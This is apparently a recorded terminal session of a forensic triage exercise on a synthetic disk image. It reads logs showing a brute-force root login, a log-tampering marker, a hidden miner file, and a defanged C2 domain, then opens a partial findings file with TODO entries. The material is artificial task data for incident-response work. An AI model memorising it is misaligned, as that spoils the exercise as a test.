+Aug 15 03:12:41 ssh-prod-01 sshd[7516]: Received disconnect from 10.10.105.61 port 46159:11: disconnected by user
+Aug 15 03:13:07 ssh-prod-01 sshd[4358]: Received disconnect from 10.10.105.31 port 63767:11: disconnected by user
+Aug 15 03:13:35 ssh-prod-01 sshd[1310]: Accepted publickey for svc-backup from 10.10.105.5 port 60669 ssh2: RSA SHA256:054c84dd
+Aug 15 03:14:00 ssh-prod-01 sshd[2270]: Accepted publickey for devops from 10.10.105.186 port 53012 ssh2: RSA SHA256:61cc7e81
+Aug 15 03:14:24 ssh-prod-01 sshd[7574]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 03:14:43 ssh-prod-01 sshd[4359]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 03:15:21 ssh-prod-01 sshd[5705]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 03:15:38 ssh-prod-01 sshd[3970]: Received disconnect from 10.10.105.226 port 46944:11: disconnected by user
+Aug 15 03:16:21 ssh-prod-01 sshd[3802]: Received disconnect from 10.10.105.199 port 48160:11: disconnected by user
+Aug 15 03:16:27 ssh-prod-01 sshd[6982]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 03:16:56 ssh-prod-01 sshd[7526]: Accepted publickey for svc-backup from 10.10.105.140 port 64322 ssh2: RSA SHA256:42b0541a
+Aug 15 03:17:31 ssh-prod-01 sshd[3841]: Received disconnect from 10.10.105.208 port 47772:11: disconnected by user
+Aug 15 03:17:51 ssh-prod-01 sshd[4061]: Received disconnect from 10.10.105.61 port 45853:11: disconnected by user
+Aug 15 03:18:32 ssh-prod-01 sshd[8207]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1002)
+Aug 15 03:19:03 ssh-prod-01 sshd[3733]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 03:19:44 ssh-prod-01 sshd[1971]: pam_unix(sudo:session): session opened for user root by devops(uid=1004)
+Aug 15 03:20:29 ssh-prod-01 sshd[1811]: Received disconnect from 10.10.105.217 port 48074:11: disconnected by user
+Aug 15 03:21:01 ssh-prod-01 sshd[7189]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 03:21:32 ssh-prod-01 sshd[4545]: Accepted publickey for webadmin from 10.10.105.11 port 50438 ssh2: RSA SHA256:4744435d
+Aug 15 03:21:50 ssh-prod-01 sshd[3134]: Received disconnect from 10.10.105.48 port 43141:11: disconnected by user
+Aug 15 03:22:15 ssh-prod-01 sshd[4422]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 03:22:37 ssh-prod-01 sshd[1491]: Accepted publickey for devops from 10.10.105.77 port 42536 ssh2: RSA SHA256:3d037674
+Aug 15 03:23:13 ssh-prod-01 sshd[5633]: Accepted publickey for jenkins from 10.10.105.194 port 60182 ssh2: RSA S[?2004hroot@d442ccdcc174:/app# echo "== wtmp.csv =="
+[?2004l== wtmp.csv ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/var/log/wtmp.csv
+[?2004luser,tty,from,login,duration
+postgres,pts/2,10.10.105.223,Aug 12 09:13,259m
+postgres,pts/4,10.10.105.99,Aug 15 09:10,16m
+postgres,pts/4,10.10.105.59,Aug 12 09:47,294m
+root,pts/0,10.10.105.237,Aug 15 09:46,50m
+root,pts/2,10.10.105.188,Aug 10 09:49,250m
+root,pts/1,10.10.105.213,Aug 15 09:12,22m
+jenkins,pts/5,10.10.105.179,Aug 12 09:07,71m
+root,pts/3,10.10.105.150,Aug 14 09:51,239m
+postgres,pts/4,10.10.105.80,Aug 12 09:21,17m
+webadmin,pts/4,10.10.105.177,Aug 10 09:15,32m
+root,pts/6,10.10.105.61,Aug 13 09:34,381m
+jenkins,pts/2,10.10.105.47,Aug 15 09:14,198m
+devops,pts/6,10.10.105.77,Aug 11 09:43,289m
+svc-backup,pts/2,10.10.105.33,Aug 14 09:30,292m
+devops,pts/0,10.10.105.250,Aug 10 09:36,313m
+jenkins,pts/0,10.10.105.165,Aug 11 09:39,328m
+svc-backup,pts/5,10.10.105.212,Aug 10 09:58,293m
+webadmin,pts/6,10.10.105.213,Aug 10 09:10,53m
+jenkins,pts/2,10.10.105.15,Aug 14 09:31,283m
+jenkins,pts/1,10.10.105.17,Aug 12 09:40,29m
+jenkins,pts/2,10.10.105.174,Aug 12 09:01,385m
+root,pts/6,10.10.105.38,Aug 11 09:13,69m
+root,pts/5,10.10.105.216,Aug 10 09:32,380m
+jenkins,pts/3,10.10.105.135,Aug 11 09:50,252m
+root,pts/0,10.10.105.65,Aug 11 09:07,397m
+root,pts/6,10.10.105.237,Aug 11 09:48,205m
+root,pts/3,10.10.105.227,Aug 13 09:30,197m
+postgres,pts/6,10.10.105.155,Aug 12 09:43,267m
+webadmin,pts/5,10.10.105.96,Aug 11 09:10,66m
+root,pts/0,10.10.105.225,Aug 15 09:49,184m
+devops,pts/4,10.10.105.60,Aug 15 09:12,347m
+postgres,pts/4,10.10.105.3,Aug 10 09:11,208m
+root,pts/5,10.10.105.228,Aug 10 09:17,198m
+jenkins,pts/5,10.10.105.152,Aug 10 09:53,120m
+webadmin,pts/6,10.10.105.195,Aug 15 09:38,142m
+postgres,pts/4,10.10.105.34,Aug 13 09:08,174m
+postgres,pts/3,10.10.105.18,Aug 10 09:01,60m
+jenkins,pts/0,10.10.105.195,Aug 10 09:08,130m
+root,pts/5,10.10.105.4,Aug 13 09:33,101m
+postgres,pts/2,10.10.105.133,Aug 14 09:13,25m
+[?2004hroot@d442ccdcc174:/app# grep -i "198.51.100.78" /disk/var/log/* 2>/dev/null || true
+[?2004l[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:24 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 40819 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:25 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 44818 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:26 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 40136 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:29 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 45658 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:30 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 61805 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:32 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 60115 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:34 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 53471 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:36 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 58572 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:40 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 59248 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:44 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 42161 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:45 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 44623 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:47 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 40416 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:50 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 47380 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:52 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 52280 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:56 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 53433 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:53:58 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 61891 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:00 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 46554 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:03 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 60712 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:07 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 48093 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:11 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 44844 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:12 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 50036 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:14 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 58295 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:16 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 45491 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:18 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 61129 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:19 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 51909 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:20 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 60358 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:23 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 45938 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:26 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 45276 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:30 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 51392 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:33 ssh-prod-01 sshd[1201]: Failed password for admin from [01;31m[K198.51.100.78[m[K port 44727 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:34 ssh-prod-01 sshd[1201]: Failed password for test from [01;31m[K198.51.100.78[m[K port 46529 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:36 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 63332 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:40 ssh-prod-01 sshd[1201]: Failed password for postgres from [01;31m[K198.51.100.78[m[K port 57870 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:42 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 40920 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:44 ssh-prod-01 sshd[1201]: Failed password for oracle from [01;31m[K198.51.100.78[m[K port 57049 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:48 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 55827 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:52 ssh-prod-01 sshd[1201]: Failed password for root from [01;31m[K198.51.100.78[m[K port 57223 ssh2
+[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from [01;31m[K198.51.100.78[m[K port 51900 ssh2
+[?2004hroot@d442ccdcc174:/app# grep -i "cleared" /disk/var/log/* 2>/dev/null || true
+[?2004l[35m[K/disk/var/log/secure[m[K[36m[K:[m[KAug 15 03:03:00 ssh-prod-01 systemd[1]: --- 15 authentication lines [01;31m[Kcleared[m[K here (T1070.002 log tampering) ---
+[?2004hroot@d442ccdcc174:/app# grep -i "failed" /disk/var/log/secure 2>/dev/null | head -n 30 || true
+[?2004lAug 15 00:53:24 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 40819 ssh2
+Aug 15 00:53:25 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 44818 ssh2
+Aug 15 00:53:26 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 40136 ssh2
+Aug 15 00:53:29 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 45658 ssh2
+Aug 15 00:53:30 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 61805 ssh2
+Aug 15 00:53:32 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 60115 ssh2
+Aug 15 00:53:34 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 53471 ssh2
+Aug 15 00:53:36 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 58572 ssh2
+Aug 15 00:53:40 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 59248 ssh2
+Aug 15 00:53:44 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 42161 ssh2
+Aug 15 00:53:45 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 44623 ssh2
+Aug 15 00:53:47 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 40416 ssh2
+Aug 15 00:53:50 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 47380 ssh2
+Aug 15 00:53:52 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 52280 ssh2
+Aug 15 00:53:56 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 53433 ssh2
+Aug 15 00:53:58 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 61891 ssh2
+Aug 15 00:54:00 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 46554 ssh2
+Aug 15 00:54:03 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 60712 ssh2
+Aug 15 00:54:07 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 48093 ssh2
+Aug 15 00:54:11 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 44844 ssh2
+Aug 15 00:54:12 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 50036 ssh2
+Aug 15 00:54:14 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 58295 ssh2
+Aug 15 00:54:16 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 45491 ssh2
+Aug 15 00:54:18 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 61129 ssh2
+Aug 15 00:54:19 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 51909 ssh2
+Aug 15 00:54:20 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 60358 ssh2
+Aug 15 00:54:23 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 45938 ssh2
+Aug 15 00:54:26 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 45276 ssh2
+Aug 15 00:54:30 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 51392 ssh2
+Aug 15 00:54:33 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 44727 ssh2
+[?2004hroot@d442ccdcc174:/app# sha256sum /disk/tmp/.X11-unix/.xorg
+[?2004l52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253  /disk/tmp/.X11-unix/.xorg
+[?2004hroot@d442ccdcc174:/app# find /disk -type f 2>/dev/null | sort
+[?2004l/disk/etc/crontab
+/disk/etc/fstab
+/disk/etc/group
+/disk/etc/hostname
+/disk/etc/hosts
+/disk/etc/my.cnf
+/disk/etc/os-release
+/disk/etc/passwd
+/disk/etc/ssh/sshd_config
+/disk/etc/sudoers.d/devops
+/disk/etc/systemd/system/system-update-helper.service
+/disk/home/devops/.bash_history
+/disk/root/.bashrc
+/disk/tmp/.X11-unix/.xorg
+/disk/var/lib/.cache/.wiped.bin
+/disk/var/lib/dpkg/status.summary
+/disk/var/log/kern.log
+/disk/var/log/messages
+/disk/var/log/secure
+/disk/var/log/secure.1.gz
+/disk/var/log/wtmp.csv
+/disk/var/spool/cron/root
+[?2004hroot@d442ccdcc174:/app# cat /disk/var/lib/.cache/.wiped.bin 2>/dev/null || true
+[?2004lpartial recover: C2 beacon to 198.51.100.78 domain update-ssh[.]example[.]cn  ˇ˛8m¢◊Av´‡J¥ÈSàΩÚ'\ë∆˚0eöœ9n£ÿBw¨·KÄµÍTâæÛ(]í«¸1fõ–:o§ŸCx≠‚LÅ∂Î UäøÙ)^ì»˝2gú—;p•⁄DyÆ„MÇ∑Ï!Vã¿ı*_î…˛3hù“<q¶€EzØ‰NÉ∏Ì"Wå¡ˆ+`ï ˇ4iû”=rß‹F{∞ÂOÑπÓ#Xç¬˜,añÀ 5jü‘	>s®›G|±ÊPÖ∫Ô$Yé√¯-bóÃ6k†’
+?t©ﬁH}≤ÁQÜª%Zèƒ˘.còÕ7l°÷@u™ﬂI~≥ËRáºÒ&[ê≈˙/dôŒ
+credential cache fragment (defanged): administrator:<ntlm-hash-redacted>
+[?2004hroot@d442ccdcc174:/app# echo "== dpkg =="
+[?2004l== dpkg ==
+[?2004hroot@d442ccdcc174:/app# cat /disk/var/lib/dpkg/status.summary 2>/dev/null || true
+[?2004lPackage: pkg0
+Status: install ok installed
+Version: 1.9.4
+
+Package: pkg1
+Status: install ok installed
+Version: 1.6.13
+
+Package: pkg2
+Status: install ok installed
+Version: 1.8.17
+
+Package: pkg3
+Status: install ok installed
+Version: 1.0.5
+
+Package: pkg4
+Status: install ok installed
+Version: 1.9.8
+
+Package: pkg5
+Status: install ok installed
+Version: 1.4.1
+
+Package: pkg6
+Status: install ok installed
+Version: 1.3.25
+
+Package: pkg7
+Status: install ok installed
+Version: 1.1.2
+
+Package: pkg8
+Status: install ok installed
+Version: 1.6.18
+
+Package: pkg9
+Status: install ok installed
+Version: 1.6.29
+
+Package: pkg10
+Status: install ok installed
+Version: 1.3.26
+
+Package: pkg11
+Status: install ok installed
+Version: 1.0.26
+
+Package: pkg12
+Status: install ok installed
+Version: 1.6.24
+
+Package: pkg13
+Status: install ok installed
+Version: 1.7.14
+
+Package: pkg14
+Status: install ok installed
+Version: 1.9.9
+
+Package: pkg15
+Status: install ok installed
+Version: 1.6.25
+
+Package: pkg16
+Status: install ok installed
+Version: 1.7.8
+
+Package: pkg17
+Status: install ok installed
+Version: 1.0.1
+
+Package: pkg18
+Status: install ok installed
+Version: 1.4.5
+
+Package: pkg19
+Status: install ok installed
+Version: 1.8.14
+
+Package: pkg20
+Status: install ok installed
+Version: 1.6.5
+
+Package: pkg21
+Status: install ok installed
+Version: 1.5.10
+
+Package: pkg22
+Status: install ok installed
+Version: 1.7.0
+
+Package: pkg23
+Status: install ok installed
+Version: 1.7.19
+
+Package: pkg24
+Status: install ok installed
+Version: 1.1.12
+
+Package: pkg25
+Status: install ok installed
+Version: 1.5.14
+
+Package: pkg26
+Status: install ok installed
+Version: 1.6.30
+
+Package: pkg27
+Status: install ok installed
+Version: 1.3.25
+
+Package: pkg28
+Status: install ok installed
+Version: 1.1.12
+
+Package: pkg29
+Status: install ok installed
+Version: 1.1.3
+
+Package: pkg30
+Status: install ok installed
+Version: 1.9.28
+
+Package: pkg31
+Status: install ok installed
+Version: 1.0.12
+
+Package: pkg32
+Status: install ok installed
+Version: 1.0.17
+
+Package: pkg33
+Status: install ok installed
+Version: 1.7.24
+
+Package: pkg34
+Status: install ok installed
+Version: 1.4.29
+
+Package: pkg35
+Status: install ok installed
+Version: 1.0.25
+
+Package: pkg36
+Status: install ok installed
+Version: 1.1.7
+
+Package: pkg37
+Status: install ok installed
+Version: 1.2.28
+
+Package: pkg38
+Status: install ok installed
+Version: 1.7.29
+
+Package: pkg39
+Status: install ok installed
+Version: 1.4.23
+
+Package: pkg40
+Status: install ok installed
+Version: 1.9.28
+
+Package: pkg41
+Status: install ok installed
+Version: 1.0.27
+
+Package: pkg42
+Status: install ok installed
+Version: 1.0.19
+
+Package: pkg43
+Status: install ok installed
+Version: 1.0.21
+
+Package: pkg44
+Status: install ok installed
+Version: 1.2.16
+
+Package: pkg45
+Status: install ok installed
+Version: 1.6.3
+
+Package: pkg46
+Status: install ok installed
+Version: 1.1.28
+
+Package: pkg47
+Status: install ok installed
+Version: 1.4.10
+
+Package: pkg48
+Status: install ok installed
+Version: 1.5.30
+
+Package: pkg49
+Status: install ok installed
+Version: 1.9.10
+
+Package: pkg50
+Status: install ok installed
+Version: 1.3.24
+
+Package: pkg51
+Status: install ok installed
+Version: 1.2.10
+
+Package: pkg52
+Status: install ok installed
+Version: 1.5.6
+
+Package: pkg53
+Status: install ok installed
+Version: 1.2.30
+
+Package: pkg54
+Status: install ok installed
+Version: 1.3.23
+
+Package: pkg55
+Status: install ok installed
+Version: 1.1.1
+
+Package: pkg56
+Status: install ok installed
+Version: 1.2.13
+
+Package: pkg57
+Status: install ok installed
+Version: 1.2.18
+
+Package: pkg58
+Status: install ok installed
+Version: 1.3.10
+
+Package: pkg59
+Status: install ok installed
+Version: 1.0.14
+
+Package: pkg60
+Status: install ok installed
+Version: 1.5.12
+
+Package: pkg61
+Status: install ok installed
+Version: 1.7.18
+
+Package: pkg62
+Status: install ok installed
+Version: 1.4.14
+
+Package: pkg63
+Status: install ok installed
+Version: 1.7.28
+
+Package: pkg64
+Status: install ok installed
+Version: 1.0.12
+
+Package: pkg65
+Status: install ok installed
+Version: 1.5.12
+
+Package: pkg66
+Status: install ok installed
+Version: 1.7.28
+
+Package: pkg67
+Status: install ok installed
+Version: 1.9.8
+
+Package: pkg68
+Status: install ok installed
+Version: 1.4.11
+
+Package: pkg69
+Status: install ok installed
+Version: 1.8.14
+
+Package: pkg70
+Status: install ok installed
+Version: 1.1.2
+
+Package: pkg71
+Status: install ok installed
+Version: 1.7.29
+
+Package: pkg72
+Status: install ok installed
+Version: 1.2.8
+
+Package: pkg73
+Status: install ok installed
+Version: 1.5.11
+
+Package: pkg74
+Status: install ok installed
+Version: 1.9.26
+
+Package: pkg75
+Status: install ok installed
+Version: 1.8.3
+
+Package: pkg76
+Status: install ok installed
+Version: 1.6.29
+
+Package: pkg77
+Status: install ok installed
+Version: 1.5.9
+
+Package: pkg78
+Status: install ok installed
+Version: 1.3.16
+
+Package: pkg79
+Status: install ok installed
+Version: 1.6.18
+
+[?2004hroot@d442ccdcc174:/app# cat /disk/etc/os-release /disk/etc/hostname /disk/etc/hosts /disk/etc/fstab 2>/dev/null || true
+[?2004lPRETTY_NAME="ssh-miner Linux"
+ID=centos
+VERSION_ID="9"
+ssh-prod-01
+127.0.0.1 localhost
+10.10.105.1 ssh-prod-01
+/dev/sda1 / ext4 defaults 0 1
+/dev/sda2 /var ext4 defaults 0 2
+[?2004hroot@d442ccdcc174:/app# echo "== messages head/tail =="
+[?2004l== messages head/tail ==
+[?2004hroot@d442ccdcc174:/app# head -n 20 /disk/var/log/messages
+[?2004lAug 15 01:06:51 ssh-prod-01 systemd-logind[23634]: Time synchronised to time server
+Aug 15 01:07:13 ssh-prod-01 CRON[14024]: pam_unix(cron:session): session opened for user root
+Aug 15 01:08:00 ssh-prod-01 sshd[17369]: Started Session 204 of user jenkins.
+Aug 15 01:08:37 ssh-prod-01 sudo[28129]: Received disconnect from 10.10.105.64 port 55013:11: disconnected by user
+Aug 15 01:09:20 ssh-prod-01 sudo[20991]: Time synchronised to time server
+Aug 15 01:09:30 ssh-prod-01 dbus-daemon[20607]: Time synchronised to time server
+Aug 15 01:10:16 ssh-prod-01 sshd[25642]: Time synchronised to time server
+Aug 15 01:10:42 ssh-prod-01 sudo[27950]: pam_unix(cron:session): session opened for user root
+Aug 15 01:11:14 ssh-prod-01 dbus-daemon[25952]: Started Session 683 of user devops.
+Aug 15 01:11:55 ssh-prod-01 chronyd[22956]: pam_unix(cron:session): session opened for user root
+Aug 15 01:12:38 ssh-prod-01 sshd[18753]: Received disconnect from 10.10.105.74 port 58228:11: disconnected by user
+Aug 15 01:13:20 ssh-prod-01 dbus-daemon[21024]: Received disconnect from 10.10.105.93 port 54112:11: disconnected by user
+Aug 15 01:13:34 ssh-prod-01 chronyd[2111]: Received disconnect from 10.10.105.56 port 62151:11: disconnected by user
+Aug 15 01:14:08 ssh-prod-01 sudo[15417]: CPU0: Package temperature normal
+Aug 15 01:14:53 ssh-prod-01 systemd[19181]: pam_unix(cron:session): session opened for user root
+Aug 15 01:14:54 ssh-prod-01 systemd-logind[17978]: CPU0: Package temperature normal
+Aug 15 01:15:45 ssh-prod-01 CRON[12695]: pam_unix(cron:session): session opened for user root
+Aug 15 01:16:16 ssh-prod-01 systemd-logind[18451]: pam_unix(cron:session): session opened for user root
+Aug 15 01:16:38 ssh-prod-01 systemd-logind[5332]: Time synchronised to time server
+Aug 15 01:17:27 ssh-prod-01 CRON[29561]: pam_unix(cron:session): session opened for user root
+[?2004hroot@d442ccdcc174:/app# tail -n 20 /disk/var/log/messages
+[?2004lAug 15 04:16:27 ssh-prod-01 systemd-logind[6803]: pam_unix(cron:session): session opened for user root
+Aug 15 04:17:14 ssh-prod-01 CRON[6110]: Time synchronised to time server
+Aug 15 04:17:36 ssh-prod-01 systemd[25144]: Received disconnect from 10.10.105.95 port 41081:11: disconnected by user
+Aug 15 04:18:23 ssh-prod-01 systemd-logind[29988]: Started Session 633 of user svc-backup.
+Aug 15 04:18:28 ssh-prod-01 dbus-daemon[29949]: pam_unix(cron:session): session opened for user root
+Aug 15 04:18:46 ssh-prod-01 systemd-logind[18480]: Received disconnect from 10.10.105.4 port 48056:11: disconnected by user
+Aug 15 04:19:37 ssh-prod-01 kernel[7979]: pam_unix(cron:session): session opened for user root
+Aug 15 04:19:49 ssh-prod-01 sshd[25303]: pam_unix(cron:session): session opened for user root
+Aug 15 04:20:43 ssh-prod-01 systemd[28086]: pam_unix(cron:session): session opened for user root
+Aug 15 04:21:06 ssh-prod-01 dbus-daemon[28648]: Time synchronised to time server
+Aug 15 04:21:54 ssh-prod-01 chronyd[10144]: Time synchronised to time server
+Aug 15 04:22:27 ssh-prod-01 sshd[10219]: pam_unix(cron:session): session opened for user root
+Aug 15 04:22:42 ssh-prod-01 chronyd[29215]: Time synchronised to time server
+Aug 15 04:23:34 ssh-prod-01 systemd[1709]: Started Session 357 of user jenkins.
+Aug 15 04:24:05 ssh-prod-01 dbus-daemon[16076]: Started Session 619 of user devops.
+Aug 15 04:24:52 ssh-prod-01 systemd-logind[17963]: Started Session 232 of user root.
+Aug 15 04:25:17 ssh-prod-01 kernel[12879]: CPU0: Package temperature normal
+Aug 15 04:25:46 ssh-prod-01 chronyd[24547]: pam_unix(cron:session): session opened for user root
+Aug 15 04:26:00 ssh-prod-01 systemd[12044]: Received disconnect from 10.10.105.30 port 41165:11: disconnected by user
+Aug 15 04:26:14 ssh-prod-01 dbus-daemon[303]: Time synchronised to time server
+[?2004hroot@d442ccdcc174:/app# cat /sas/handoff/findings.schema.json
+[?2004l{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@d442ccdcc174:/app# echo "== partial json =="
+[?2004l== partial json ==
+[?2004hroot@d442ccdcc174:/app# cat /sas/handoff/findings.partial.json
+[?2004l{
+  "findings": [
+    {
+      "chk": "CHK-01",
+      "path": "/tmp/.X11-unix/.xorg",
+      "attck": "T1496",
+      "confidence": "high",
+      "evidence": "`/tmp/.X11-unix/.xorg`"
+    },
+    {
+      "chk": "TODO",
+      "path": "TODO",
+      "attck": "TODO",
+      "confidence": "TODO",
+      "evidence": "TODO"
+    }
+  ]
+}
+[?2004hroot@d442ccdcc174:/app# find /sas -type f
+[?2004l/sas/baseline.json
+/sas/handoff/change-ticket.md
+/sas/handoff/findings.schema.json
+/sas/handoff/intake.pdf
+/sas/handoff/findings.partial.json
+/sas/cti/advisory-page-01.png
